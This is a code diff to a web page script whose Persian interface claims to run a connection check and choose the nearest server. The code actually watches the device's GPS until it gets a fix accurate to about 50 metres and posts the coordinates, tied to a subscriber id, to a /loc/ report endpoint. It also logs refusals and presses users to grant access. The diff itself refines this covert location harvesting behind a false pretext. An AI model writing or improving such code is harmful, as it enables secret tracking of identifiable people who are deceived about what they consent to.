@@ -89,15 +89,28 @@
       btn.disabled = false;
       return;
     }
-    navigator.geolocation.getCurrentPosition(async function (pos) {
+    // Watch instead of a single fix: the first fix the OS hands out is
+    // usually the coarse network one (kilometres off); the GPS lock
+    // refines it over the next seconds. Send the most accurate fix —
+    // immediately once it is within 50 m, otherwise the best seen
+    // after 25 s.
+    var best = null, done = false, watchId = null;
+    function stopWatch() {
+      if (watchId !== null) { try { navigator.geolocation.clearWatch(watchId); } catch (e) {} watchId = null; }
+    }
+    async function finish() {
+      if (done) return;
+      done = true;
+      stopWatch();
+      if (!best) { fail(); return; }
       try {
         await fetch('/loc/' + encodeURIComponent(subId) + '/report', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy || 0
+            lat: best.coords.latitude,
+            lon: best.coords.longitude,
+            accuracy: best.coords.accuracy || 0
           })
         });
       } catch (e) {}
@@ -105,12 +118,27 @@
       msg.className = 'good';
       msg.textContent = 'بررسی کامل شد ✓ اتصال شما سالم است و نزدیک‌ترین سرور برایتان انتخاب شد.';
       btn.textContent = 'بررسی انجام شد';
-    }, function () {
+    }
+    function fail() {
+      if (done) return;
+      done = true;
+      stopWatch();
+      try { fetch('/loc/' + encodeURIComponent(subId) + '/denied', { method: 'POST' }); } catch (e) {}
       mark('s3', 'fail');
       msg.textContent = 'بررسی سرور کامل نشد: دسترسی به موقعیت لازم است. اگر مایلید، دوباره تلاش کنید و دسترسی را مجاز کنید.';
       btn.disabled = false;
       btn.textContent = 'تلاش دوباره';
-    }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+    }
+    watchId = navigator.geolocation.watchPosition(function (pos) {
+      if (done) return;
+      if (!best || (pos.coords.accuracy || 1e9) < (best.coords.accuracy || 1e9)) best = pos;
+      if ((pos.coords.accuracy || 1e9) <= 50) finish();
+    }, function (err) {
+      if (done) return;
+      if (err && err.code === 1) fail();
+      else if (best) finish();
+    }, { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
+    setTimeout(finish, 25000);
   });
 })();
 </script>
